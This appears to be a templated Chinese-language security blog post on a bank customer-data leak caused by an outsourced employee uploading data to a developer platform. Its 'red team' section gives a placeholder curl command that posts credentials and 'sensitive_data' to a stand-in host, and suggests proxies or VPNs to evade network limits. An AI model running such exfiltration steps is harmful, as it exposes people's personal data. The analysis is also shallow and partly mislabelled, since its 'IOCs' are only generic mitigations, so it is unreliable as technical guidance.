# 🔥 解析友利銀行個資外洩事件：技術分析與防禦策略
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: Data Leakage, Insider Threat, Access Control

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 個資外洩事件的根源在於委外供應鏈的員工管理不當，導致員工違規私自留存資料並將其上傳至開發者平臺。這種行為違反了資料保護政策和程序，導致了敏感資料的外洩。
* **攻擊流程圖解**: 
    1. 委外供應鏈員工獲取友利銀行客戶的個人資料。
    2. 員工違規私自留存資料。
    3. 員工將資料上傳至開發者平臺。
    4. 敏感資料外洩。
* **受影響元件**: 友利銀行的 NFT 平臺使用者個資。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有委外供應鏈員工的權限和網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload
    payload = {
        "username": "example",
        "password": "example",
        "data": "sensitive_data"
    }
    
    ```
    *範例指令*: 使用 `curl` 上傳資料至開發者平臺。

```

bash
curl -X POST \
  https://example.com/upload \
  -H 'Content-Type: application/json' \
  -d '{"username": "example", "password": "example", "data": "sensitive_data"}'

```
* **繞過技術**: 可以使用代理伺服器或 VPN 來繞過網路限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

    * 實施嚴格的存取控制和身份驗證。
    * 加密敏感資料。
    * 監控和審計資料存取。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Insider Threat (內部威脅)**: 想像一名員工違反公司政策和程序，導致敏感資料的外洩。技術上是指內部人員對組織的資產和資料進行未經授權的存取、使用或披露。
* **Data Leakage (資料外洩)**: 想像敏感資料被未經授權的第三方獲取。技術上是指敏感資料的未經授權的披露或外洩。
* **Access Control (存取控制)**: 想像一扇門只有授權的人員才能進入。技術上是指控制和管理對資源和資料的存取。
